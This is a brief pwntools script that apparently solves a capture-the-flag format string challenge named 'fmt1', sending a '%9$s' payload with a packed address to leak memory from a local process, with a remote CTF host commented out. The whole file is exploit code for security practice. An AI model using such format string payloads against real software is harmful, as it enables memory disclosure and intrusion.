from pwn import *
#p=remote('45.122.249.68',9418)
p=process('./fmt1')
raw_input('DEBUG')
p.recvuntil("This is format string no the buffer overflow\n\n")
p.recvuntil("Input:\n")
payload = b' -%9$s- '
payload += p64(0x404040)

p.sendline(payload)

print(p.recv())
p.interactive()

